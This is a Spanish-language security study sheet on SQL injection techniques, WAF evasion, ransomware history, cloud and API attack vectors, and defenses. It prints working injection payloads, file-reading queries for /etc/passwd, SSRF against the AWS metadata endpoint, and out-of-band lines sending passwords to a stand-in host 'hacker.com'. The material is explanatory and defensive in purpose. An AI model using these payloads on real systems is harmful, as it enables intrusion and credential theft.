Conceptos Clave 2025

  • ▸ Triple Extorsión: Cifrado + Robo + Ataque DDoS/Acoso a clientes.
  • ▸ OOB SQLi: Extracción de datos vía canales alternativos (DNS/HTTP) cuando no hay respuesta visual.
  • ▸ BOLA (API): Acceso a objetos de otros usuarios manipulando IDs en APIs REST.
  • ▸ Second-Order SQLi: El payload se guarda durmiente y se ejecuta en una consulta futura.
Técnicas de Inyección

Fundamentos de Inyección

In-Band (UNION Based)

La más rápida. Los datos robados aparecen directamente en la pantalla de la aplicación.

http://web.com?id=1 UNION SELECT username, password FROM users--

Error-Based

Se fuerza un error de sintaxis o conversión que "escupe" los datos internos en el mensaje de error.

... CAST((SELECT password FROM users LIMIT 1) AS int) ...
Error: Conversion failed when converting the varchar value 'P@ssw0rd123' to data type int.

Blind (Ciega)

No hay salida visual. Se infiere información bit a bit.

  • Booleana: Si la página carga normal, la condición es TRUE.
    id=1 AND (SELECT substring(pass,1,1))='a'
  • Time-Based: Si la página tarda 10 segundos, la condición es TRUE.
    id=1'; IF (1=1) WAITFOR DELAY '0:0:10'--

Inyección Aritmética Ciega

Cuando los operadores lógicos (AND/OR) están filtrados o causan errores de sintaxis complejos, usamos matemáticas para inferir datos.

División por Cero

Si la condición es cierta, provocamos un error matemático.

id = 3 - (0 / (SELECT ...condición...))
  • Si condición devuelve 0 (FALSE) -> 3 - (0/0) -> ERROR
  • Si condición devuelve 1 (TRUE) -> 3 - (0/1) -> 3 -> OK

Desbordamiento (Overflow)

Provocar error excediendo la capacidad numérica.

... * 99999999999999999999 ...

Descarga Remota de Archivos (RFD)

Abuso de privilegios de base de datos para leer archivos sensibles del Sistema Operativo (/etc/passwd, boot.ini).

Microsoft SQL Server (OLE DB)

SELECT * FROM OpenRowSet('MSDASQL', 'Driver={Microsoft Text Driver (*.txt)};DefaultDir=C:\;', 'select * from password.txt')

Requiere configuración DisallowAd-hocAccess = 0.

MySQL (Load File)

SELECT Load_File('/etc/passwd')

Alternativa: LOAD DATA INFILE para volcar contenido a una tabla temporal y luego leerla.

Técnicas Avanzadas

Crítico

Out-of-Band (OOB)

Cuando la inyección es ciega total y el tiempo es inestable. Forzamos al servidor DB a conectarse a nosotros (DNS/HTTP).

-- Oracle (HTTP) SELECT UTL_HTTP.REQUEST('http://hacker.com/'||pass) FROM users;
-- MSSQL (DNS/SMB) xp_dirtree '\\hacker.com\share'

Second-Order SQLi

El ataque durmiente. Inyectamos el payload al crear un usuario (ej. admin'--). No pasa nada. El ataque se detona días después, cuando un administrador revisa ese usuario y la aplicación usa el nombre almacenado en otra consulta insegura.

Evasión de WAF

HPP (Parameter Pollution)

Enviar el mismo parámetro dos veces. WAF lee uno, backend lee otro.

id=1&id=UNION SELECT...
Ofuscación de Espacios

Reemplazar espacios por comentarios o saltos de línea.

SELECT/**/user/**/FROM/**/users
Fragmentación JSON

Dividir payloads en estructuras JSON anidadas que el WAF no procesa.

Codificación Rara

Uso de IBM EBCDIC o UTF-7 si la base de datos lo soporta.

Evolución del Ransomware

Del cifrado simple a la extorsión psicológica. Los grupos de ransomware modernos operan como multinacionales del crimen (RaaS).

FASE 1 (2013-2017)

Cifrado Masivo

Cryptolocker, Wannacry. Objetivo: Bloquear sistemas.

FASE 2 (2019+)

Doble Extorsión

Maze, REvil. Antes de cifrar, roban los datos y amenazan con publicarlos.

FASE 3 (2024+)

Triple Extorsión

BlackCat, LockBit. Cifrado + Robo + DDoS a la víctima o llamadas a sus clientes.

Vectores Cloud & API

La nube elimina perímetros. La identidad es el nuevo firewall.

SSRF en Cloud

Engañar al servidor para acceder a la API de metadatos interna.

http://169.254.169.254/latest/meta-data/

Devuelve credenciales temporales (IAM Roles) para robar la cuenta AWS.

Buckets Públicos

Configuraciones erróneas en S3/Azure Blob.

Permitir lectura a "Authenticated Users" (cualquier usuario de AWS) causa fugas masivas.

API: BOLA

Broken Object Level Authorization (IDOR en APIs).

GET /api/user/100 (Mío) GET /api/user/101 (Tuyo)

Infraestructura Física y de Red

Antes de la nube, estos eran los vectores principales. Siguen siendo críticos en entornos híbridos y on-premise.

Acceso y Seguridad Física

Si un atacante accede físicamente al servidor, puede robar discos duros o instalar keyloggers. El robo de cintas de backup es también un riesgo crítico.
Mitigación: Cifrado de datos en reposo (TDE), controles biométricos y vigilancia.

Datos en Tránsito (Sniffing)

Intercepción de tráfico de base de datos no cifrado. Un atacante en la red interna puede capturar consultas SQL y resultados en texto plano.
Mitigación: Uso forzoso de TLS/SSL para todas las conexiones a la base de datos.

Configuraciones Inseguras por Defecto

Muchos sistemas (MongoDB, ElasticSearch) vienen con puertos abiertos (27017, 9200) y sin contraseña por defecto.
Riesgo: Indexación automática por motores como Shodan y secuestro inmediato de datos.

"Damn Small SQLi Scanner". Script minimalista para detección rápida sin explotación pesada.

Estrategia de Defensa 2025

Más allá del WAF. RASP se ejecuta dentro de la aplicación e inspecciona las consultas SQL antes de que lleguen a la base de datos, bloqueando ataques en tiempo real, incluso si el tráfico parece legítimo.

El Ransomware moderno busca y destruye backups online. La solución es usar almacenamiento WORM (Write Once Read Many) y mantener copias desconectadas físicamente (Air-Gapped).

La base de datos no debe confiar ciegamente en la red interna. Se debe implementar autenticación fuerte (MFA) y mTLS (Mutual TLS) para validar cada conexión, no solo el perímetro.

Herramientas automatizadas que escanean continuamente la nube (AWS, Azure) para detectar malas configuraciones, como buckets S3 públicos o grupos de seguridad demasiado permisivos, antes de que sean explotados.
